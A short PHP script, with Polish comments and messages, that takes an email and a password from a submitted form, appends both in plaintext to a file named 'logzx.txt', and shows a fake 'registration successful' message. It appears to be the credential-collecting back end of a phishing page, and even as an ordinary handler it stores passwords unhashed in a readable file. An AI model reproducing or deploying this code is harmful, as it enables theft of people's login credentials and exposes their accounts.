<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = $_POST["email"];
  $password = $_POST["password"];

  // Zapisz dane do pliku "logzx.txt"
  $data = "E-mail: $email, Hasło: $password\n";
  file_put_contents("logzx.txt", $data, FILE_APPEND);

  echo "Rejestracja zakończona sukcesem.";
}
?>
